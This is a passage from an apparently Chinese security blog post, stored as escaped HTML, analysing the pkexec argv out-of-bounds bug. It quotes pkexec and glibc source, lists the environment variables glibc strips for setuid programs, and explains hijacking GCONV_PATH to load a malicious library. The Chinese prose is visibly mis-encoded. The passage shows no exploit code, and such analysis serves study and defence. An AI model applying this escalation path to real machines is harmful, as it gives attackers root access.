class=\"markdownIt-Anchor\" href=\"#åŸç†åˆ†æ\">#</a> åŸç†åˆ†æ</h2>\n<h3 id=\"æ•°ç»„è¶Šç•Œ\"><a class=\"markdownIt-Anchor\" href=\"#æ•°ç»„è¶Šç•Œ\">#</a> æ•°ç»„è¶Šç•Œ</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span> <span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  Â·Â·Â·Â·Â·Â·Â·</span><br><span class=\"line\">  <span class=\"type\">const</span> gchar *environment_variables_to_save[] = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;SHELL&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LANG&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LINGUAS&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LANGUAGE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_COLLATE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_CTYPE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_MESSAGES&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_MONETARY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_NUMERIC&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_TIME&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_ALL&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;TERM&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;COLORTERM&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* By default we don&#x27;t allow running X11 apps, as it does not work in the</span></span><br><span class=\"line\"><span class=\"comment\">     * general case. See</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     *  https://bugs.freedesktop.org/show_bug.cgi?id=17970#c26</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * and surrounding comments for a lot of discussion about this.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * However, it can be enabled for some selected and tested legacy programs</span></span><br><span class=\"line\"><span class=\"comment\">     * which previously used e. g. gksu, by setting the</span></span><br><span class=\"line\"><span class=\"comment\">     * org.freedesktop.policykit.exec.allow_gui annotation to a nonempty value.</span></span><br><span class=\"line\"><span class=\"comment\">     * See https://bugs.freedesktop.org/show_bug.cgi?id=38769 for details.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"string\">&quot;DISPLAY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;XAUTHORITY&quot;</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  GPtrArray *saved_env;</span><br><span class=\"line\">  gchar *opt_user;</span><br><span class=\"line\">  <span class=\"type\">pid_t</span> pid_of_caller;</span><br><span class=\"line\">  gpointer local_agent_handle;</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = <span class=\"number\">127</span>;</span><br><span class=\"line\">  authority = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  subject = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  details = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  result = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  action_id = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  saved_env = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  path = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  command_line = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  opt_user = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  local_agent_handle = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* check for correct invocation */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">geteuid</span> () != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;pkexec must be setuid root\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  original_user_name = <span class=\"built_in\">g_strdup</span> (<span class=\"built_in\">g_get_user_name</span> ());</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (original_user_name == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Error getting user name.\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((original_cwd = <span class=\"built_in\">g_get_current_dir</span> ()) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Error getting cwd: %s\\n&quot;</span>,</span><br><span class=\"line\">                  <span class=\"built_in\">g_strerror</span> (errno));</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* First process options and find the command-line to invoke. Avoid using fancy library routines</span></span><br><span class=\"line\"><span class=\"comment\">   * that depend on environtment variables since we haven&#x27;t cleared the environment just yet.</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  opt_show_help = FALSE;</span><br><span class=\"line\">  opt_show_version = FALSE;</span><br><span class=\"line\">  opt_disable_internal_agent = FALSE;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (n = <span class=\"number\">1</span>; n &lt; (guint) argc; n++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--help&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_show_help = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--version&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_show_version = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--user&quot;</span>) == <span class=\"number\">0</span> || <span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;-u&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          n++;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (n &gt;= (guint) argc)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">usage</span> (argc, argv);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (opt_user != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;--user specified twice\\n&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          opt_user = <span class=\"built_in\">g_strdup</span> (argv[n]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--disable-internal-agent&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_disable_internal_agent = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>90 è¡Œ n æ˜¯ä» 1 å¼€å§‹çš„<br>\n 120 è¡Œ break æ˜¯é€€å‡ºå¾ªç¯ï¼Œè¯´æ˜æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤<br>\nåé¢éƒ¨åˆ†</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">g_assert</span> (argv[argc] == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">path = <span class=\"built_in\">g_strdup</span> (argv[n]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (path == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">usage</span> (argc, argv);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (path[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class=\"line\">    s = <span class=\"built_in\">g_find_program_in_path</span> (path);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Cannot run program %s: %s\\n&quot;</span>, path, <span class=\"built_in\">strerror</span> (ENOENT));</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    <span class=\"built_in\">g_free</span> (path);</span><br><span class=\"line\">    path = s;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* argc&lt;2 and pkexec runs just shell, argv is guaranteed to be null-terminated.</span></span><br><span class=\"line\"><span class=\"comment\">     * /-less shell shouldn&#x27;t happen, but let&#x27;s be defensive and don&#x27;t write to null-termination</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argv[n] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      argv[n] = path;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>g_find_program_in_path (path)</code>  æœç´¢å‘½ä»¤çš„ç»å¯¹è·¯å¾„</li>\n<li>ç»å¯¹è·¯å¾„è¢«å›å†™å› <code>argv[n]</code></li>\n</ul>\n<p>å¯¹äºå‘½ä»¤è¡Œå‚æ•° <code>argv[]</code>  æ˜¯åœ¨ <code>environ[]</code>  ä¹‹åè¿ç€è¢«å‹å…¥çš„<br>\nå‘½ä»¤è¡Œå¯åŠ¨ <code>pkexec</code> ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è‡ªå·± <code>&quot;pkexec&quot;</code> <br>\n ä½†æ˜¯å¦‚æœç”¨ <code>execve</code>  å¯åŠ¨ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯ <code>NULL</code>  äº†ï¼Œç¬¬äºŒä¸ªå°±æ˜¯ç¯å¢ƒå˜é‡ <code>environ[0]</code></p>\n<h3 id=\"dlåäº‹åšå°½\"><a class=\"markdownIt-Anchor\" href=\"#dlåäº‹åšå°½\">#</a> dl åäº‹åšå°½</h3>\n<p>glibc2.27 ****/elf/dl-support.c : 307</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_dl_non_dynamic_init (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  Â·Â·Â·Â·Â·Â·Â·Â·</span><br><span class=\"line\">  Â·Â·Â·Â·Â·Â·Â·Â·</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__libc_enable_secure)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> unsecure_envvars[] =</span><br><span class=\"line\">\tUNSECURE_ENVVARS</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> EXTRA_UNSECURE_ENVVARS</span></span><br><span class=\"line\">\tEXTRA_UNSECURE_ENVVARS</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t;</span><br><span class=\"line\">      <span class=\"type\">const</span> <span class=\"type\">char</span> *cp = unsecure_envvars;</span><br><span class=\"line\">      <span class=\"comment\">// æ¸…é™¤ä¸å®‰å…¨çš„ç¯å¢ƒå˜é‡</span></span><br><span class=\"line\">      <span class=\"keyword\">while</span> (cp &lt; unsecure_envvars + <span class=\"built_in\">sizeof</span> (unsecure_envvars))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  __unsetenv (cp);</span><br><span class=\"line\">\t  cp = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) __rawmemchr (cp, <span class=\"string\">&#x27;\\0&#x27;</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !HAVE_TUNABLES</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__access (<span class=\"string\">&quot;/etc/suid-debug&quot;</span>, F_OK) != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t__unsetenv (<span class=\"string\">&quot;MALLOC_CHECK_&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_PLATFORM_INIT</span></span><br><span class=\"line\">  DL_PLATFORM_INIT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_OSVERSION_INIT</span></span><br><span class=\"line\">  DL_OSVERSION_INIT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* Now determine the length of the platform string.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_dl_platform != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    _dl_platformlen = <span class=\"built_in\">strlen</span> (_dl_platform);</span><br><span class=\"line\">  <span class=\"comment\">/* Scan for a program header telling us the stack is nonexecutable.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_dl_phdr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">uint_fast16_t</span> i = <span class=\"number\">0</span>; i &lt; _dl_phnum; ++i)</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_dl_phdr[i].p_type == PT_GNU_STACK)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  _dl_stack_flags = _dl_phdr[i].p_flags;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_SYSINFO_IMPLEMENTATION</span></span><br><span class=\"line\">DL_SYSINFO_IMPLEMENTATION</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> ENABLE_STATIC_PIE</span></span><br><span class=\"line\"><span class=\"comment\">/* Since relocation to hidden _dl_main_map causes relocation overflow on</span></span><br><span class=\"line\"><span class=\"comment\">   aarch64, a function is used to get the address of _dl_main_map.  */</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">link_map</span> *</span><br><span class=\"line\">_dl_get_dl_main_map (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> &amp;_dl_main_map;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>è€Œ <code>UNSECURE_ENVVARS</code>  çš„å˜é‡æ˜¯å®šä¹‰åœ¨ glibc-2.27/sysdeps/generic/unsecvars.h : 10</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !HAVE_TUNABLES</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> GLIBC_TUNABLES_ENVVAR <span class=\"string\">&quot;GLIBC_TUNABLES\\0&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> GLIBC_TUNABLES_ENVVAR</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"comment\">/* Environment variable to be removed for SUID programs.  The names are</span></span><br><span class=\"line\"><span class=\"comment\">   all stuffed in a single string which means they have to be terminated</span></span><br><span class=\"line\"><span class=\"comment\">   with a &#x27;\\0&#x27; explicitly.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> UNSECURE_ENVVARS \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;GCONV_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;GETCONF_DIR\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  GLIBC_TUNABLES_ENVVAR\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;HOSTALIASES\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_AUDIT\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DEBUG\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DEBUG_OUTPUT\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DYNAMIC_WEAK\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_HWCAP_MASK\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_LIBRARY_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_ORIGIN_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_PRELOAD\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_PROFILE\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_SHOW_AUXV\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_USE_LOAD_BIAS\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LOCALDOMAIN\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LOCPATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;MALLOC_TRACE\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;NIS_PATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;NLSPATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;RESOLV_HOST_CONF\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;RES_OPTIONS\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;TMPDIR\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;TZDIR\\0&quot;</span></span></span><br></pre></td></tr></table></figure>\n<p>å½“æ£€æµ‹ç¨‹åºæ˜¯ç‰¹æƒæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šæ¸…ç©ºä¸Šé¢çš„ç¯å¢ƒå˜é‡<br>\næ‰€ä»¥ä¸èƒ½ç›´æ¥å½“ç¯å¢ƒå˜é‡ä¼ å…¥<br>\nä½†è¿™æ¬¡æˆ‘ä»¬æœ‰ä¸€æ¬¡ä»»æ„å†™æœºä¼š<br>\néœ€è¦åŠ«æŒç¯å¢ƒå˜é‡å¼•å…¥æˆ‘ä»¬çš„æ¶æ„åº“</p>\n<h3 id=\"åŠ«æŒç¯å¢ƒå˜é‡\"><a class=\"markdownIt-Anchor\" href=\"#åŠ«æŒç¯å¢ƒå˜é‡\">#</a> åŠ«æŒç¯å¢ƒå˜é‡</h3>\n<p>åˆ©ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯ <code>GCONV_PATH</code> <br>\n<a href=\"https://trganda.github.io/posts/iconv/\">https://trganda.github.io/posts/iconv/</a></p>\n<blockquote>\n<p>In <a href=\"https://www.gnu.org/software/libc/manual/html_node/Generic-Conversion-Interface.html\">glib</a>, a module named iconv support convert a charset to another. And the conversion was implemented in such dynamic library (gconv module) which implement pre-request <a href=\"https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.4%20iconv%20module%20interfaces\">interface</a>, the usage of these gconv module were defined in a configuration file with name 